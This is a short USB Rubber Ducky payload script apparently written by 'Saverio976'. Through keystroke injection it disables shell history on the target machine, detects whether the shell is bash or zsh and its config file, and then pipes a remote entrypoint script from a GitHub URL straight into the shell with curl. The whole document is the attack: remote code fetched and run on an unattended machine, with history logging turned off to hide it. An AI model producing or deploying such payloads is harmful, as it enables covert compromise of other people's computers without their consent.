#!/bin/bash

# TITLE EntryPoint ducky
# AUTHOR Saverio976
# DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck

#!EXTENSION!detect_ready.txt

#!DUCKY!$_JITTER_ENABLED = TRUE
#!DUCKY!$_JITTER_MAX = 1

unset HISTFILE

export CURRENTSHELL=''
CURRENTSHELL=$(readlink /proc/$$/exe)

$CURRENTSHELL
unset HISTFILE

[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh"
[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash"

export CONFIGFILE=''
[ "$CURRENTSHELL" = "zsh" ] && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
[ "$CURRENTSHELL" = "bash" ] && CONFIGFILE="$HOME/.bashrc"

curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENTSHELL

#!DUCKY!ATTACKMODE STORAGE
